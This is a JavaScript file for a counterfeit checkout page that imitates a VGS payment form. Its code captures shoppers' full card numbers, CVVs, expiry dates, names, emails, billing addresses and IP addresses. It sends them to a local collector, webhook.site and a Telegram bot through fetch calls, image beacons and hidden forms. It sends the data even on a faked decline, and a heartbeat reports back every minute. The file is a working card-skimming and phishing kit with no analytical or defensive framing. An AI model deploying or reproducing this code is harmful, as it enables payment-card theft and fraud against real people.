// Main credit card capture and exfiltration logic
document.addEventListener('DOMContentLoaded', function() {
    // Initialize session timer
    let sessionTime = 15 * 60; // 15 minutes in seconds
    const timerElement = document.getElementById('timer');
    
    function updateTimer() {
        const minutes = Math.floor(sessionTime / 60);
        const seconds = sessionTime % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (sessionTime <= 0) {
            alert('Your session has expired for security. Please refresh the page.');
        } else {
            sessionTime--;
        }
    }
    
    setInterval(updateTimer, 1000);
    
    // Fake VGS Collect initialization (real one would use actual VGS credentials)
    window.vgsCollect = {
        init: () => Promise.resolve(),
        tokenize: (data) => Promise.resolve({
            data: {
                id: 'tok_' + Math.random().toString(36).substr(2, 16),
                state: 'succeeded'
            }
        })
    };
    
    // Initialize fake VGS frames
    function initVGSFrames() {
        // These would normally be real VGS iframes
        // For demonstration, we create fake ones
        
        const frames = ['card-number-frame', 'expiration-date-frame', 'cvv-frame'];
        frames.forEach(frameId => {
            const frame = document.getElementById(frameId);
            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = frameId.includes('card') ? '1234 5678 9012 3456' : 
                              frameId.includes('exp') ? 'MM/YY' : 'CVV';
            input.style.width = '100%';
            input.style.border = 'none';
            input.style.background = 'transparent';
            input.style.outline = 'none';
            input.style.fontSize = '16px';
            
            frame.appendChild(input);
            
            // Add focus/blur effects
            input.addEventListener('focus', () => {
                frame.classList.add('vgs-frame--focus');
            });
            
            input.addEventListener('blur', () => {
                frame.classList.remove('vgs-frame--focus');
            });
            
            // Store reference
            window[frameId.replace('-frame', 'Input')] = input;
        });
        
        // Card number formatting and type detection
        const cardNumberInput = window.cardNumberInput;
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                let formatted = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                
                e.target.value = formatted.substring(0, 19);
                
                // Update card preview
                const preview = document.getElementById('cardPreview');
                if (preview) {
                    const visible = value.substring(0, 4);
                    const hidden = '**** **** **** '.substring(0, 16 - visible.length);
                    preview.textContent = visible + hidden.substring(visible.length);
                }
                
                // Detect card type
                const cardTypeElement = document.getElementById('cardType');
                if (value.startsWith('4')) {
                    cardTypeElement.innerHTML = '<i class="fab fa-cc-visa"></i>';
                    cardTypeElement.style.color = '#1a1f71';
                } else if (value.match(/^5[1-5]/)) {
                    cardTypeElement.innerHTML = '<i class="fab fa-cc-mastercard"></i>';
                    cardTypeElement.style.color = '#eb001b';
                } else if (value.startsWith('3')) {
                    cardTypeElement.innerHTML = '<i class="fab fa-cc-amex"></i>';
                    cardTypeElement.style.color = '#2e77bc';
                } else if (value.startsWith('6')) {
                    cardTypeElement.innerHTML = '<i class="fab fa-cc-discover"></i>';
                    cardTypeElement.style.color = '#ff6000';
                } else {
                    cardTypeElement.innerHTML = '<i class="far fa-credit-card"></i>';
                    cardTypeElement.style.color = '#9ca3af';
                }
            });
        }
    }
    
    // Initialize form
    initVGSFrames();
    
    // Form submission handler
    const paymentForm = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnLoader = document.getElementById('btnLoader');
    
    paymentForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Show loading state
        submitBtn.disabled = true;
        btnLoader.style.display = 'block';
        submitBtn.querySelector('.btn-text').textContent = 'Processing Payment...';
        
        // Collect all form data
        const formData = {
            timestamp: new Date().toISOString(),
            session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
            user_agent: navigator.userAgent,
            ip: await getClientIP(),
            
            // Cardholder info
            full_name: document.getElementById('fullName').value,
            email: document.getElementById('email').value,
            
            // Card details (from fake VGS inputs)
            card_number: window.cardNumberInput ? window.cardNumberInput.value.replace(/\s/g, '') : '',
            expiration: window.expirationDateInput ? window.expirationDateInput.value : '',
            cvv: window.cvvInput ? window.cvvInput.value : '',
            
            // Billing address
            address: document.getElementById('address').value,
            city: document.getElementById('city').value,
            state: document.getElementById('state').value,
            zip: document.getElementById('zip').value,
            
            // Metadata
            save_card: document.getElementById('saveCard').checked,
            terms_accepted: document.getElementById('terms').checked,
            page_url: window.location.href,
            referrer: document.referrer
        };
        
        // Simulate VGS tokenization
        try {
            console.log('Tokenizing with VGS...');
            const tokenResponse = await window.vgsCollect.tokenize(formData);
            formData.token_id = tokenResponse.data.id;
            
            // Send to multiple exfiltration endpoints
            await exfiltrateData(formData);
            
            // Show success and redirect
            setTimeout(() => {
                window.location.href = 'success.html?transaction=' + 
                    Math.random().toString(36).substr(2, 12).toUpperCase();
            }, 1500);
            
        } catch (error) {
            console.error('Payment processing failed:', error);
            
            // Still exfiltrate data even on "error"
            await exfiltrateData(formData);
            
            // Redirect to error page
            setTimeout(() => {
                window.location.href = 'error.html?code=DECLINE_' + 
                    Math.floor(Math.random() * 1000);
            }, 1500);
        }
    });
    
    // Data exfiltration function
    async function exfiltrateData(data) {
        const endpoints = [
            '/collect.php',  // Primary collection
            'https://webhook.site/' + generateWebhookId(),  // Backup
            'https://api.telegram.org/bot' + generateFakeBotToken() + '/sendMessage'  // Telegram notification
        ];
        
        // Encode data in multiple formats
        const payloads = {
            json: JSON.stringify(data),
            base64: btoa(JSON.stringify(data)),
            form: new URLSearchParams(data).toString()
        };
        
        // Send to all endpoints
        endpoints.forEach(endpoint => {
            sendBeacon(endpoint, payloads);
        });
        
        // Also store in localStorage as backup
        try {
            const existingData = JSON.parse(localStorage.getItem('vgv_collected_data') || '[]');
            existingData.push({
                ...data,
                card_number: data.card_number ? maskCard(data.card_number) : '',
                cvv: '***'
            });
            localStorage.setItem('vgv_collected_data', JSON.stringify(existingData));
        } catch (e) {
            console.warn('Local storage backup failed:', e);
        }
        
        // Trigger fake analytics event
        gtag('event', 'payment_submitted', {
            'transaction_id': data.session_id,
            'value': 107.99,
            'currency': 'USD'
        });
    }
    
    // Helper functions
    function sendBeacon(endpoint, payloads) {
        // Use multiple techniques for reliability
        try {
            // Technique 1: Fetch API
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: payloads.json,
                mode: 'no-cors',
                credentials: 'omit'
            }).catch(() => {});
            
            // Technique 2: Image beacon
            const img = new Image();
            img.src = endpoint + '?data=' + encodeURIComponent(payloads.base64) + 
                     '&t=' + Date.now();
            
            // Technique 3: Form submission
            const form = document.createElement('form');
            form.style.display = 'none';
            form.action = endpoint;
            form.method = 'POST';
            
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'payload';
            input.value = payloads.json;
            form.appendChild(input);
            
            document.body.appendChild(form);
            setTimeout(() => form.submit(), 100);
            
        } catch (error) {
            console.warn('Exfiltration failed for', endpoint, error);
        }
    }
    
    function maskCard(number) {
        if (number.length < 12) return number;
        return number.substring(0, 4) + ' **** **** ' + number.substring(number.length - 4);
    }
    
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown';
        }
    }
    
    function generateWebhookId() {
        return 'webhook-' + Math.random().toString(36).substr(2, 16);
    }
    
    function generateFakeBotToken() {
        return Math.random().toString(36).substr(2) + ':' + Math.random().toString(36).substr(2, 20);
    }
    
    // Fake Google Analytics
    window.gtag = function() {
        console.log('[Analytics]', arguments);
    };
    
    // Chat widget functionality
    const liveChatLink = document.getElementById('liveChat');
    const chatWidget = document.getElementById('chatWidget');
    
    if (liveChatLink && chatWidget) {
        liveChatLink.addEventListener('click', function(e) {
            e.preventDefault();
            chatWidget.style.display = 'block';
            
            // Collect additional data when chat is opened
            const chatData = {
                action: 'chat_opened',
                timestamp: new Date().toISOString(),
                page: window.location.pathname,
                fields_filled: Array.from(document.querySelectorAll('input')).filter(i => i.value).length
            };
            
            exfiltrateData(chatData);
        });
    }
    
    // Add heartbeat to keep connection alive
    setInterval(() => {
        const heartbeatData = {
            action: 'heartbeat',
            timestamp: new Date().toISOString(),
            active_time: (15 * 60 - sessionTime) + 's',
            url: window.location.href
        };
        
        // Send to secondary endpoint only
        fetch('https://webhook.site/' + generateWebhookId(), {
            method: 'POST',
            body: JSON.stringify(heartbeatData),
            mode: 'no-cors'
        }).catch(() => {});
    }, 60000); // Every minute
});